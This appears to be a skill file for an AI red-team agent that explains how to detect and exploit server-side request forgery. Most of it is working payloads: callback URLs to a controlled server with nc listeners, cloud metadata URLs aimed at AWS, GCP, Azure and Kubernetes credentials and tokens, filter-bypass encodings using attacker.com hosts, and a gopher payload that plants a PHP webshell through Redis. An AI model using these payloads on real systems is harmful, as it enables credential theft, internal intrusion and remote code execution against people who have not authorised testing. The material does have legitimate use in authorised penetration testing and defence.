---
name: ssrf-testing
description: Detect and exploit server-side request forgery to access internal resources and cloud metadata
origin: RedteamOpencode
---

# SSRF Testing

## When to Activate

- Parameter accepts a URL or hostname (webhooks, image fetch, import, preview)
- PDF/document generators that fetch remote resources
- File upload via URL (avatar from URL, import from URL)
- API integrations, proxy endpoints, or redirect handlers
- Parameters like: `url=`, `uri=`, `path=`, `src=`, `dest=`, `redirect=`, `feed=`, `link=`

## Detection

### 1. Out-of-Band Detection

Confirm the server makes requests by pointing to a controlled server.

```bash
# Use Burp Collaborator, interactsh, or your own server
?url=http://COLLABORATOR_DOMAIN/ssrf-test
?url=http://YOUR_SERVER:8888/ssrf-test

# Start a listener
python3 -m http.server 8888
nc -lvp 8888
```

If you receive a hit, SSRF is confirmed. Check the User-Agent and source IP.

### 2. Internal Network Probing

```
# Localhost variations
http://127.0.0.1/
http://localhost/
http://0.0.0.0/
http://[::1]/
http://127.1/
http://0/
http://0x7f000001/
http://2130706433/         # Decimal for 127.0.0.1

# Internal network ranges
http://10.0.0.1/
http://172.16.0.1/
http://192.168.1.1/
http://169.254.169.254/    # Cloud metadata
```

### 3. Protocol Testing

```
# HTTP/HTTPS
http://internal-host/
https://internal-host/

# File protocol
file:///etc/passwd
file:///c:/windows/win.ini

# Gopher (if supported — powerful for internal service interaction)
gopher://127.0.0.1:6379/_INFO        # Redis
gopher://127.0.0.1:3306/_            # MySQL

# Dict
dict://127.0.0.1:6379/INFO

# FTP
ftp://127.0.0.1/
```

### 4. Port Scanning via SSRF

```
# Scan internal ports by observing response differences
http://127.0.0.1:22/    # SSH — different error than closed port
http://127.0.0.1:80/    # HTTP
http://127.0.0.1:3306/  # MySQL
http://127.0.0.1:6379/  # Redis
http://127.0.0.1:8080/  # Alt HTTP
http://127.0.0.1:9200/  # Elasticsearch
http://127.0.0.1:27017/ # MongoDB

# Indicators of open vs closed:
# - Response time differences
# - Different error messages
# - Content length changes
# - HTTP status code differences
```

## Cloud Metadata Exploitation

### AWS

```
# IMDSv1 (no token needed)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
http://169.254.169.254/latest/user-data

# IMDSv2 (requires token — usually blocks SSRF unless you can set headers)
# Step 1: Get token
PUT http://169.254.169.254/latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600
# Step 2: Use token
GET http://169.254.169.254/latest/meta-data/
X-aws-ec2-metadata-token: TOKEN

# Key targets
/latest/meta-data/hostname
/latest/meta-data/local-ipv4
/latest/meta-data/iam/security-credentials/
/latest/meta-data/iam/security-credentials/ROLE_NAME  # AWS keys!
/latest/dynamic/instance-identity/document
```

### GCP

```
# Requires header: Metadata-Flavor: Google (blocks basic SSRF unless header injection)
http://metadata.google.internal/computeMetadata/v1/instance/
http://metadata.google.internal/computeMetadata/v1/project/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email

# Legacy endpoint (no header required)
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
```

### Azure

```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Requires header: Metadata: true

http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

### Kubernetes

```
# Service account token
file:///var/run/secrets/kubernetes.io/serviceaccount/token
file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt
file:///var/run/secrets/kubernetes.io/serviceaccount/namespace

# Kubernetes API
https://kubernetes.default.svc/
http://10.96.0.1/  # Common cluster IP
```

## Filter Bypass Techniques

### IP Address Encoding

```
# Decimal
http://2130706433/           # 127.0.0.1
http://3232235777/           # 192.168.1.1

# Hex
http://0x7f000001/           # 127.0.0.1
http://0x7f.0x00.0x00.0x01/

# Octal
http://0177.0.0.01/          # 127.0.0.1
http://0177.0000.0000.0001/

# Mixed notation
http://127.0.0x0.1/
http://0x7f.1/

# IPv6
http://[::1]/
http://[0000::0001]/
http://[::ffff:127.0.0.1]/   # IPv4-mapped IPv6
```

### DNS Rebinding

```
# Use a DNS rebinding service
# First resolution: allowed external IP
# Second resolution: 127.0.0.1

# Tools:
# - rbndr.us/dword (e.g., 7f000001.YOUR_IP.rbndr.us)
# - Your own DNS server with short TTL

# Register domain pointing to 127.0.0.1
# nip.io: 127.0.0.1.nip.io
# sslip.io: 127-0-0-1.sslip.io
```

### URL Parsing Tricks

```
# Credential section (@ bypass)
http://attacker.com@127.0.0.1/
http://127.0.0.1#@attacker.com/
http://attacker.com%00@127.0.0.1/

# URL redirect chains
http://allowed-domain.com/redirect?url=http://127.0.0.1/

# Fragment / encoding
http://127.0.0.1%00.allowed.com/
http://127.0.0.1%2523@allowed.com/

# Backslash (some parsers)
http://allowed.com\@127.0.0.1/

# Subdomain bypass
http://127.0.0.1.allowed.com/    # If wildcard DNS
http://allowed.com.attacker.com/  # Subdomain of attacker
```

### Protocol Smuggling with Gopher

```
# Redis — write webshell
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A

# Use Gopherus tool to generate payloads
gopherus --exploit redis
gopherus --exploit mysql
gopherus --exploit smtp
```

## Internal Service Exploitation

```
# Elasticsearch
http://127.0.0.1:9200/_cat/indices
http://127.0.0.1:9200/_search?q=*

# Redis
# Via gopher or dict protocol
dict://127.0.0.1:6379/INFO

# Docker API
http://127.0.0.1:2375/containers/json
http://127.0.0.1:2375/images/json

# Consul
http://127.0.0.1:8500/v1/agent/members
http://127.0.0.1:8500/v1/kv/?recurse

# Kubernetes API
https://127.0.0.1:6443/api/
https://127.0.0.1:10250/pods/
```

## What to Record

- **Vulnerable parameter:** name, location, and how it processes URLs
- **SSRF type:** blind (OOB confirmation only) vs full response
- **Accessible internal resources:** IPs, ports, services discovered
- **Cloud metadata extracted:** instance role, credentials, tokens
- **Filter bypasses used:** what was blocked and how it was circumvented
- **Protocols supported:** HTTP, file, gopher, dict, etc.
- **Impact:** internal network access, credential theft, RCE via internal services
- **Exact payloads:** copy-paste reproducible URLs
